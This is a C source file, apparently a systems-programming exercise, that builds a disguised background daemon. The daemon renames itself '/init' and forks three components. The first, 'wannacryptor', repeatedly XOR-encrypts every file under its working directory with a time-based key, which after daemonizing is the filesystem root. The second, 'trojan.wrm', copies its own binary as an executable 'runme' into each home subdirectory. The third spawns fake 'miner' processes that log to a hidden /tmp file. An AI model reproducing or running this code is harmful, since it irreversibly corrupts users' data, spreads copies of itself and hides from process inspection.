#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <time.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <signal.h>
#include <sys/prctl.h>

#define MAX_MINERS 5

void xor_encrypt_file(const char *path, unsigned char key) {
    FILE *file = fopen(path, "rb");
    if (!file) return;

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    rewind(file);

    unsigned char *data = malloc(size);
    if (!data) {
        fclose(file);
        return;
    }

    fread(data, 1, size, file);
    fclose(file);

    for (long i = 0; i < size; i++) {
        data[i] ^= key;
    }

    file = fopen(path, "wb");
    if (file) {
        fwrite(data, 1, size, file);
        fclose(file);
    }

    free(data);
}

void encrypt_directory(const char *dir_path, unsigned char key) {
    DIR *dir = opendir(dir_path);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char full_path[512];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);

        struct stat st;
        if (stat(full_path, &st) == 0) {
            if (S_ISREG(st.st_mode)) {
                xor_encrypt_file(full_path, key);
            } else if (S_ISDIR(st.st_mode)) {
                encrypt_directory(full_path, key);
            }
        }
    }

    closedir(dir);
}

void wannacryptor() {
    prctl(PR_SET_NAME, "wannacryptor");
    while (1) {
        unsigned char key = (unsigned char)(time(NULL) & 0xFF);
        char cwd[256];
        getcwd(cwd, sizeof(cwd));
        encrypt_directory(cwd, key);
        sleep(30);
    }
}


void trojan_wrm() {
    prctl(PR_SET_NAME, "trojan.wrm");
    char *binary_path = "/proc/self/exe";
    const char *home = getenv("HOME");
    if (!home) return;

    while (1) {
        DIR *dir = opendir(home);
        if (!dir) return;

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
                char target_path[512];
                snprintf(target_path, sizeof(target_path), "%s/%s/runme", home, entry->d_name);

                int src_fd = open(binary_path, O_RDONLY);
                int dst_fd = open(target_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);

                if (src_fd >= 0 && dst_fd >= 0) {
                    char buffer[4096];
                    ssize_t n;
                    while ((n = read(src_fd, buffer, sizeof(buffer))) > 0) {
                        write(dst_fd, buffer, n);
                    }
                    close(src_fd);
                    close(dst_fd);
                }
            }
        }
        closedir(dir);
        sleep(30);
    }
}

void miner_loop(int id) {
    char name[32];
    sprintf(name, "mine-crafter-%d", id);
    prctl(PR_SET_NAME, name);

    while (1) {
        // Delay antara 3 - 30 detik
        int delay = 3 + rand() % 28;
        sleep(delay);

        char hash[65];
        for (int i = 0; i < 64; i++) {
            int r = rand() % 16;
            hash[i] = "0123456789abcdef"[r];
        }
        hash[64] = '\0';

        time_t now = time(NULL);
        struct tm *t = localtime(&now);
        char timestamp[64];
        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", t);

        FILE *log = fopen("/tmp/.miner.log", "a");
        if (log) {
            fprintf(log, "[%s][Miner %02d] %s\n", timestamp, id, hash);
            fclose(log);
        }
    }
}

void rodok_exe() {
    prctl(PR_SET_NAME, "rodok.exe");
    for (int i = 0; i < MAX_MINERS; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            miner_loop(i);
            exit(0);
        }
    }
    while (1) pause();
}

void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    setsid();
    if (chdir("/")) exit(EXIT_FAILURE);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    prctl(PR_SET_NAME, "/init");
}

int main() {
    srand(time(NULL));
    daemonize();

    pid_t pid;

    pid = fork();
    if (pid == 0) {
        wannacryptor();
        exit(0);
    }

    pid = fork();
    if (pid == 0) {
        trojan_wrm();
        exit(0);
    }

    pid = fork();
    if (pid == 0) {
        rodok_exe();
        exit(0);
    }

    while (1) pause();
    return 0;
}
